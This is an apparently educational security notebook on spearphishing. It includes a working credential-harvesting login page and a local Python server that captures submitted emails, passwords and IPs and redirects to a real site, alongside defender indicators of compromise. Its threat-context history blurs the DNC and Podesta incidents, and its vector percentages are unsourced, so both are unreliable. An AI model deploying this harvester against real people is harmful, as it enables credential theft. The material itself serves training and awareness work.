# 05 — Spearphishing Credential Harvesting

| Field | Value |
|-------|-------|
| **MITRE ATT&CK ID** | T1566 — Phishing |
| **Tactic** | Execution / Initial Access |
| **Difficulty** | Beginner |
| **Estimated Time** | 35 minutes |

## Threat Context: 2016 DNC Hack — Fancy Bear Spearphishing

In March 2016, Russian state-sponsored group APT28 (Fancy Bear) sent spearphishing emails to members of the Democratic National Committee. The emails impersonated Google security alerts, directing victims to a credential-harvesting page that mimicked the Google login screen. When John Podesta's aide forwarded the email to IT, a typo in the response ("This is a legitimate email" instead of "illegitimate") led Podesta to enter his credentials on the fake page.

This single successful phish led to the exfiltration of over 50,000 emails and became one of the most consequential cyberattacks in political history. **Phishing remains the #1 initial access vector**, accounting for over 40% of breaches according to the Verizon DBIR.

## What You'll Understand After This

- How attackers create **credential-harvesting pages** that clone legitimate login forms
- The **anatomy of a phishing campaign**: email crafting, URL obfuscation, and landing pages
- How to **detect phishing infrastructure** through domain analysis, email headers, and user reporting

In [ ]:
# EDUCATIONAL PURPOSE ONLY
# Environment setup and imports

import http.server
import threading
import json
import tempfile
import os
from urllib.request import urlopen
from urllib.parse import parse_qs, urlparse
from collections import Counter

print("[+] Imports loaded successfully")
print("[i] This notebook creates a LOCAL-ONLY credential harvesting page for analysis.")
print("[i] The page is served on 127.0.0.1 and demonstrates phishing technique structure.")

### Step 1 — Generate a Credential Harvesting Page

Phishing pages are typically clones of legitimate login pages. Here we generate a minimal HTML form to study its structure. This is the same approach used in security awareness testing tools like GoPhish.

In [ ]:
# EDUCATIONAL PURPOSE ONLY — generate a sample credential harvesting page
# This is a MINIMAL form for structural analysis, not a real phishing kit

PHISHING_HTML = """<!DOCTYPE html>
<html>
<head>
    <title>Account Login - EDUCATIONAL DEMO</title>
    <style>
        body { font-family: Arial, sans-serif; background: #f5f5f5; display: flex;
               justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .login-box { background: white; padding: 40px; border-radius: 8px;
                     box-shadow: 0 2px 10px rgba(0,0,0,0.1); width: 360px; }
        .login-box h2 { text-align: center; color: #333; }
        .warning { background: #e74c3c; color: white; padding: 10px; border-radius: 4px;
                   text-align: center; margin-bottom: 20px; font-size: 12px; }
        input { width: 100%; padding: 12px; margin: 8px 0; border: 1px solid #ddd;
                border-radius: 4px; box-sizing: border-box; }
        button { width: 100%; padding: 12px; background: #4285f4; color: white;
                 border: none; border-radius: 4px; cursor: pointer; font-size: 16px; }
    </style>
</head>
<body>
    <div class="login-box">
        <div class="warning">EDUCATIONAL DEMO - NOT A REAL LOGIN PAGE</div>
        <h2>Sign In</h2>
        <form method="GET" action="/harvest">
            <input type="text" name="email" placeholder="Email" value="demo@example.com">
            <input type="password" name="password" placeholder="Password" value="demo123">
            <button type="submit">Sign In</button>
        </form>
    </div>
</body>
</html>"""

print("[+] Generated credential harvesting page HTML")
print(f"[i] HTML size: {len(PHISHING_HTML)} bytes")
print("[i] Key phishing indicators in this page:")
print("    - Form submits credentials to /harvest endpoint")
print("    - Mimics a legitimate login form layout")
print("    - In real attacks: logo theft, CSS cloning, URL obfuscation")

### Step 2 — Serve the Page Locally and Capture a Submission

We serve the page on localhost and simulate a form submission to show how captured credentials appear on the attacker's side.

In [ ]:
# EDUCATIONAL PURPOSE ONLY — local phishing page server

PHISH_PORT = 18882
captured_creds = []

class PhishHandler(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        if self.path.startswith("/harvest"):
            # Parse captured credentials from query string
            parsed = urlparse(self.path)
            params = parse_qs(parsed.query)
            cred = {
                "email": params.get("email", [""])[0],
                "password": params.get("password", [""])[0],
                "ip": self.client_address[0],
            }
            captured_creds.append(cred)
            self.send_response(302)
            self.send_header("Location", "https://example.com")  # Redirect to legitimate site
            self.end_headers()
        else:
            self.send_response(200)
            self.send_header("Content-Type", "text/html")
            self.end_headers()
            self.wfile.write(PHISHING_HTML.encode())

    def log_message(self, format, *args):
        pass

phish_server = http.server.HTTPServer(("127.0.0.1", PHISH_PORT), PhishHandler)
phish_thread = threading.Thread(target=phish_server.serve_forever, daemon=True)
phish_thread.start()
print(f"[+] Phishing demo server running on http://127.0.0.1:{PHISH_PORT}")

# Simulate a victim submitting credentials
try:
    urlopen(f"http://127.0.0.1:{PHISH_PORT}/harvest?email=victim@example.com&password=MyP4ssw0rd")
except Exception:
    pass  # Redirect will cause an error, that's expected

print(f"\n[+] Captured credentials ({len(captured_creds)} entries):")
for cred in captured_creds:
    print(f"    Email: {cred['email']}, Password: {cred['password']}, Source IP: {cred['ip']}")

phish_server.shutdown()
print("\n[+] Phishing server shut down")

### Step 3 — Analyze Phishing Vector Distribution

Phishing attacks use multiple vectors. Let's examine the distribution based on industry threat reports to understand the attack surface.

In [ ]:
# EDUCATIONAL PURPOSE ONLY — phishing vector analysis

phishing_vectors = {
    "Email with malicious link": 45,
    "Email with attachment": 25,
    "SMS / Smishing": 12,
    "Voice / Vishing": 8,
    "Social media": 6,
    "QR code phishing": 4,
}

print("[+] Phishing vector distribution (% of attacks):")
for vector, pct in phishing_vectors.items():
    bar = '█' * (pct // 2)
    print(f"  {vector:<30} {bar} {pct}%")

### Visualization — Phishing Vector Distribution

In [ ]:
import matplotlib.pyplot as plt

labels = list(phishing_vectors.keys())
sizes = list(phishing_vectors.values())
colors = ["#e74c3c", "#e67e22", "#f1c40f", "#2ecc71", "#3498db", "#9b59b6"]
explode = (0.05, 0, 0, 0, 0, 0)

fig, ax = plt.subplots(figsize=(9, 6))
wedges, texts, autotexts = ax.pie(
    sizes, explode=explode, labels=labels, colors=colors,
    autopct="%1.0f%%", startangle=140, textprops={"fontsize": 9}
)
for autotext in autotexts:
    autotext.set_fontweight("bold")

ax.set_title("Phishing Attack Vectors — Distribution by Type", fontsize=13, fontweight="bold")
plt.tight_layout()
plt.show()
print("[+] Visualization complete")

## Defender's Perspective — Indicators of Compromise

| Indicator | Type | Detection Method |
|-----------|------|------------------|
| Newly registered domain similar to company domain | Infrastructure | Domain monitoring (e.g., dnstwist, URLscan) |
| Email with mismatched Reply-To and From headers | Email | Email gateway header analysis |
| HTML form POSTing to non-company domain | Content | URL reputation checking, sandbox analysis |
| Multiple users reporting similar suspicious emails | Behavioral | Phishing report aggregation, SOC correlation |
| Login from unusual IP immediately after email delivery | Behavioral | Impossible travel detection, UEBA |

## Article Seed

**Title:** *One Click Away: Dissecting Modern Spearphishing Campaigns*

**Opening Paragraph:**
It took one email — crafted to look like a Google security alert — to compromise 50,000 emails and alter the course of a presidential election. Spearphishing remains the most effective initial access technique because it targets the one vulnerability that cannot be patched: human trust.

**Section Headers:**
1. Anatomy of a Spearphish: From Reconnaissance to Credential Capture
2. The Technology Behind Phishing Kits
3. Case Study: APT28 and the DNC Hack
4. Building a Human Firewall: Effective Anti-Phishing Programs

**Medium Tags:** `cybersecurity`, `phishing`, `social-engineering`, `email-security`, `mitre-attack`

In [ ]:
# Self-check assertions

# 1. Verify phishing page was generated
assert len(PHISHING_HTML) > 100, "Phishing HTML should be substantial"
assert "<form" in PHISHING_HTML, "Page should contain a form element"

# 2. Verify credentials were captured in simulation
assert len(captured_creds) >= 1, "Should have captured at least one credential submission"
assert captured_creds[0]["email"] == "victim@example.com"

# 3. Verify phishing vector data is complete
assert sum(phishing_vectors.values()) == 100, "Phishing vector percentages should sum to 100"

print("[+] All self-check assertions passed!")